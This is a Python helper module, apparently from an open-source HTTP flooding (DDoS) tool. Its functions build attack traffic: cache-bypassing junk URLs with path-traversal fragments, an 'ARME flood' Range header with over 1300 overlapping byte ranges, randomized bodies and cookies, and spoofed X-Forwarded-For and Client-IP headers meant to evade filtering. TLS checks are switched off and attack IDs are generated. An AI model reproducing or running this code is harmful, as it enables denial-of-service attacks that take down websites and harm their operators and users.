'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

import re, requests, socket, os, urllib3, json
from random import getrandbits, choice, randint, shuffle, randrange
from binascii import hexlify
from netaddr import IPNetwork
from datetime import datetime, timedelta
from tabulate import tabulate
from os.path import join, dirname, abspath
from urllib.parse import quote, urlparse

from src.core import *
from src.useragent import *
from src.referer import *

with open(join(dirname(abspath(__file__)), 'files', 'keywords.txt'), buffering=(16*1024*1024)) as file:
    keywords = file.read().splitlines()

class HTTPAdapter(requests.adapters.HTTPAdapter):
    '''
    HTTP adapter which allows socket modification
    '''

    # stolen from stackoverflow xd
    def __init__(self, *args, **kwargs):
        self.socket_options = kwargs.pop("socket_options", None)
        super(HTTPAdapter, self).__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        if self.socket_options is not None:
            kwargs["socket_options"] = self.socket_options
        super(HTTPAdapter, self).init_poolmanager(*args, **kwargs)

class utils():
    def __init__(self):
        # pre-compile the regex's, for performance
        self.ipv4regex = re.compile(r'(?m)^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
        self.ipv6regex = re.compile(r'(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))')
        self.hostregex = re.compile(r'[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}')
        self.urlregex = re.compile(r'(http|https):\/\/([\w\- ]+(?:(?:\.[\w\- ]+)+))([\w\-\.,@?^=%&:/~\+#]*[\w\-\@?^=%&/~\+#])?')
    
    def buildsession(self) -> requests.session:
        '''
        Creates a requests.session object
        '''

        adapter = HTTPAdapter(socket_options=[
            (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1), 
            (socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 5), 
            (socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5), 
            (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        ])

        session = requests.session()
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.verify = False
        session.timeout = (5,0.1)

        return session
    
    def randstr(self, strlen, chars='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') -> str:
        '''
        Function to generate a random string
        '''
        
        return ''.join(choice(chars) for _ in range(strlen))
    
    def buildblock(self, url) -> str:
        '''
        Function to generate a block of junk, that gets added to the target url
        '''

        def format(string):
            return quote(string)

        if url is None: return url
        block = '' if url.endswith('/') else '/'

        if Core.bypass_cache: # generates random pages and search queries

            block += self.randstr(randint(2, 8))
            for _ in range(randint(2, 10)):
                rand = randint(0, 3)
                if rand == 0: block += f'/{self.randstr(randint(5, 10))}'
                elif rand == 1: block += choice(['/..','\\..','%2F..','%5C..']) # magik
                else: block += f'/{self.randstr(randint(5, 10), chars="0123456789")}'
            
            block += f'?{quote(choice(keywords))}={self.randstr(randint(5, 10))}'

            for _ in range(randint(2, 9)):
                if randint(0, 1) == 1: block += f'&{self.randstr(randint(5, 10))}={format(choice(keywords))}'
                else: block += f'&{format(choice(keywords))}={format(choice(keywords))}'

            if randint(0, 2) == 0:
                block += f'#{format(choice(keywords))}'

            return url+block
        else:
            return url
        
    def buildarme(self) -> str:
        '''
        Builds the payload for the ARME flood, with a random size greater than 1300
        '''

        prefix = 'bytes=0-'
        for i in range(randint(1300, 1700)): # cant make it too big
            prefix += f',5-{str(i)}'
        
        return prefix
        
    def builddata(self, length=0) -> tuple:
        '''
        Creates a POST body
        '''

        if length == 0:
            length = randint(20,200)

        headers = {}
        if randint(0,1) == 0: # json payload
            json_data = '{'

            for _ in range(length):
                json_data += f'"{choice([self.randstr(randint(5, 20)), choice(keywords)])}": "{self.randstr(randint(40, 60))}",'
            
            json_data += '}'

            data = json_data        
            headers.update({'Content-Type': 'application/json'})

        else: # url encoded payload 
            url_encoded_data = f'{choice([self.randstr(randint(5, 20)), choice(keywords)])}={choice([self.randstr(randint(5, 20)), choice(keywords)])}'

            while len(url_encoded_data) < length:
                url_encoded_data += f'&{choice([self.randstr(randint(5, 20)), choice(keywords)])}={choice([self.randstr(randint(5, 20)), choice(keywords)])}'

            data = url_encoded_data
            headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        
        return (headers, data)
    
    def randip(self) -> str:
        '''
        Creates a random IPv4 address
        '''

        return '.'.join([str(randint(1,255)) for _ in range(4)])
    
    def buildcookie(self) -> str:
        '''
        Creates a random cookie
        '''

        cookie = choice([
            self.randstr(randint(60, 90), chars='QWERTYUIOPASDFGHJKLZXCVBNM01234567890'),
            f'_ga=GA{str(randint(1,1000))} _gat=1;{(self.randstr(randint(2,22)))}; __cfduid={self.randstr(randint(2,100), chars="qwertyuiopasdfghjklzxcvbnm0123456789")}; {self.randstr(randint(1,10))}={self.randstr(randint(100,200))}'
            f'id={self.randstr(randint(10,60))}',
            f'PHPSESSID={self.randstr(randint(50,60))}; csrftoken={self.randstr(randint(4,20))}; _gat={str(randint(0,1))}',
            f'cf_chl_2={self.randstr(randint(4,20))}; cf_chl_prog=x11; cf_clearance={self.randstr(randint(30,50))}',
            f'__cf_bm={self.randstr(randint(100,200))}; __cf_bm={self.randstr(randint(100,200))}',
            f'language=en; AKA_A2={self.randstr(randint(1,10))}; AMCVS_3AE7BD6E597F48940A495ED0%40AdobeOrg={str(randint(0,1))}; AMCV_{self.randstr(randint(20,60))}={self.randstr(randint(50,100))}; ak_bmsc={self.randstr(randint(50,100), chars="QWERTYUIOPASDFGHJKLZXCVBNM")}~{self.randstr(randint(200,600))}'
        ])

        # add a expiration date to the cookie
        if randint(0,2) == 0:
            cookie += f'; Expires={datetime.now().strftime("%a, %w %b %Y %X %p")};'

        return cookie

        
    def buildheaders(self, url) -> dict:
        '''
        Function to generate randomized headers
        '''

        cache_controls = ['no-cache', 'max-age=0', 'no-store', 'no-transform', 'only-if-cached', 'must-revalidate', 'no-transform'] if not Core.bypass_cache else ['no-store', 'no-cache', 'no-transform']
        accept_encodings = ['*', 'identity', 'gzip', 'deflate', 'compress', 'br']
        accept_langs = ["*", "af","hr","el","sq","cs","gu","pt","sw","ar","da","ht","pt-br","sv","nl","he","pa","nl-be","hi","pa-in","sv-sv","en","hu","pa-pk","ta","en-au","ar-jo","en-bz","id","rm","te","ar-kw","en-ca","iu","ro","th","ar-lb","en-ie","ga","ro-mo","tig","ar-ly","en-jm","it","ru","ts","ar-ma","en-nz","it-ch","ru-mo","tn","ar-om","en-ph","ja","sz","tr","ar-qa","en-za","kn","sg","tk","ar-sa","en-tt","ks","sa","uk","ar-sy","en-gb","kk","sc","hsb","ar-tn","en-us","km","gd","ur","ar-ae","en-zw","ky","sd","ve","ar-ye","eo","tlh","si","vi","ar","et","ko","sr","vo","hy","fo","ko-kp","sk","wa","as","fa","ko-kr","sl","cy","ast","fj","la","so","xh","az","fi","lv","sb","ji","eu","fr","lt","es","zu","bg","fr-be","lb","es-ar","be","fr-ca","mk","es-bo","bn","fr-fr","ms","es-cl","bs","fr-lu","ml","es-co","br","fr-mc","mt","es-cr","bg","fr-ch","mi","es-do","my","fy","mr","es-ec","ca","fur","mo","es-sv","ch","gd","nv","es-gt","ce","gd-ie","ng","es-hn","zh","gl","ne","es-mx","zh-hk","ka","no","es-ni","zh-cn","de","nb","es-pa","zh-sg","de-at","nn","es-py","zh-tw","de-de","oc","es-pe","cv","de-li","or","es-pr","co","de-lu","om","es-es","cr","de-ch","fa","es-uy","fa-ir","es-ve"]
        content_types = ['multipart/form-data', 'application/x-url-encoded']
        accepts = ['text/plain', '*/*', '/', 'application/json', 'text/html', 'application/xhtml+xml', 'application/xml', 'image/webp', 'image/*', 'image/jpeg', 'application/x-ms-application', 'image/gif', 'application/xaml+xml', 'image/pjpeg', 'application/x-ms-xbap', 'application/x-shockwave-flash', 'application/msword']

        # we shuffle em
        for toshuffle in [cache_controls, accept_encodings, content_types, accepts]:
            shuffle(toshuffle)
        
        headers = choice([ # chooses between XMLHttpRequest and a random/predefined useragent
            {'User-Agent': urllib3.util.SKIP_HEADER, 'X-Requested-With': 'XMLHttpRequest'},  # SKIP_HEADER makes urllib3 ignore the header, this basically removes the User-Agent header from the list
            {'User-Agent': getAgent()}
        ])

        if randint(0,2) == 1:
            headers.update({
                'X-Forwarded-Proto': 'Http',
                'X-Forwarded-Host': f'{urlparse(url).netloc}, {self.randip()}',
            })

        headers.update({ # default headers
            'Cache-Control': ', '.join([ choice(cache_controls) for _ in range( randint(1, 3) ) ]),
            'Accept-Encoding': ', '.join([ choice(accept_encodings) for _ in range( randint(1, 3) ) ]),
            'Accept': ', '.join([ choice(accepts) for _ in range( randint(1, 3) ) ]),
            'Accept-Language':  ', '.join([ choice(accept_langs) for _ in range( randint(1, 3) ) ]),
        })
        
        if randint(0,2) == 1:
            headers.update({
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Sec-Gpc': '1'
            })

        if randint(0,1) == 1: headers.update({'Upgrade-Insecure-Requests': '1'})        
        if randint(0,1) == 1: headers.update({'Referer': self.buildblock(getReferer())})        
        if randint(0,1) == 1: headers.update({'Cookie': self.buildcookie()}) # adds a fake cookie
        if randint(0,1) == 1: headers.update({ choice(['Via','Client-IP','X-Forwarded-For','Real-IP']): self.randip() }) # fakes the source ip
        
        return headers
    
    def clear(self) -> None:
        '''
        Clears the screen
        '''

        try:
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')
        except:
            print('\n'*400)

    def make_id(self) -> str:
        '''
        Helper function to make attack ID's
        '''

        return hexlify(getrandbits(128).to_bytes(16, 'little')).decode() # make a simple 32 characters long ID
    
    def valid_port(self, port: int) -> bool:
        '''
        Checks if the specified port is valid
        '''

        return port >= 0 and port < 65535 # 0 should be invalid, but since we count that as "random" we'll allow it
    
    def valid_ip(self, ip) -> bool:
        '''
        Checks if the specified IPv4/IPv6 address is valid
        '''

        if bool(self.ipv4regex.match(ip)):
            return True
        else:
            return bool(self.ipv6regex.match(ip))
        
    def cidr2iplist(self, cidrange) -> list:
        '''
        Converts a CID range to a list of IP's
        '''

        return [str(ip) for ip in IPNetwork(cidrange)]

    def unix2posix(self, timestamp) -> str:
        '''
        Converts the specified UNIX timestamp into a POSIX one
        '''

        return datetime.fromtimestamp(timestamp).strftime('%m/%d/%Y, %H:%M:%S')
    
    def posix2unix(self, timestamp) -> float:
        '''
        Converts the specified POSIX timestamp into a UNIX one
        '''

        return datetime.timestamp(datetime.strptime(timestamp, "%m/%d/%Y, %H:%M:%S"))
    
    def table(self, rows, headers) -> str:
        '''
        Creates a nice looking table
        '''

        return tabulate(rows, headers=headers, tablefmt='simple')
    
    def Sec2Str(self, sec, hide=True) -> str: # found it on stackoverflow, cheers Timothy C. Quinn
        '''
        Turns seconds into days, hours, minutes and seconds and puts that into a single string
        '''

        td = timedelta(seconds=sec)
        def __t(t, n):
            if t < n: return (t, 0)
            v = t//n
            return (t -  (v * n), v)
            
        (s, h) = __t(td.seconds, 3600)
        (s, m) = __t(s, 60)    

        result = {
            'days': td.days,
            'hours': h,
            'minutes': m,
            'seconds': s,
        }

        result = ''
        if td.days != 0: result += f'{td.days} {"days" if td.days != 1 else "day"}, '
        if h != 0: result += f'{h} {"hours" if h != 1 else "hour"}, '
        if m != 0: result += f'{m} {"minutes" if m != 1 else "minutes"}, '
        
        result += f'{s} {"seconds" if s != 1 else "second"}'

        return result
    
    def print_banner(self) -> None:
        '''
        Prints the banner
        '''

        print(r'''
                                  O*         oo                                  
                                 *@#*       *#@o                                 
                                °@#o@*     *@o#@°                                
                                O#@*#@o   o@#o@##                                
                               .@@#o##@###@##*##@.                               
                                #@##@@#@@@#@@##@#                                
                               .##@@@#@@#@@##@@##°                               
                               .######*###*O@####.                               
                   .°           #@##ooo###oooO#@#.          °                    
                 .o#@           .O@@#*°@#@°°#@@#.          .@O*.                 
             .*oO@@@#. ..*°      *#@@@O#@#o@@##o      °°.  .#@@#O*°.             
          .*#@@@@##@OO##@@O.    .#O#@#@@@@@##@O#°    .O@###oO@#@@@@#O°           
        °o#@@######Oo#@@##@#O°  O@#o###@@@##@OO@O  °o#@#@@@#o######@@@#*.        
       oo@#O##@@@@#O#@##@@#@@O o@#@#O@#####@#O@#@*.O@@#@###@#O#@#@@###@#O*       
      °o°O°###@@@####@@@@@###oo@#@#@O#@@@@@#o#####*o##@@@@@#####@@@#@O°O.o.      
      *#O°o@#@@@@###O@#@@@##o°###@@##OO####O#@#@##O.O##@@@@#O###@@@@#@**O#°      
     .#@#@@#@@@@@@@OO@#@@@@##*#@#@@@@#######@#@@#@#o##@@@@#@O#@@@@@@@#@@#@O      
    o@@#@@@@######O###@@@@#@O*@#@@@@@@@@@@@@#@@@@#@o#@#@@@@##OO#####@@@@@#@#*    
  .#@@@@####@@@@@#o###@@@@#@O°@#@@@@@@######@@@@@##°#@#@@@@###o#@@@@#####@@@@O   
 o@@@#O####@#######@@#@@@@@#@**@#@@@@@@@@@@@@@@@#@**@#@@@@@#@@@#####@@##O###@@#° 
.#@#####Oo°.      .°o@@#@@@###o#@#@@@@@@@@@@@@@#@#o##@@@@@@@o°.     .°*OO####@@#.
  °*oo°              °##@@@@#@#o#@#@@@@@@@@@@@#@#o@@@@@@###°             .*oo**  
                      #@#@#@@#@#o#@#@@@@@@@@@#@O*###@@@@#@#                      
                     °*O@#@####@O°o@##@@@@@##@o.#@#@####@O*.                     
                        O##@@@##@#°o@@#@@@#@@*.#@##@@@@@O                        
                         °.o##@@@@#**#@###@#**#@@@@@#o°°                         
                              °oO#@@O*O@@#o*O@@@#o°.                             
                                  °*oO**O**OO*°.''') # art made using https://image2ascii.com/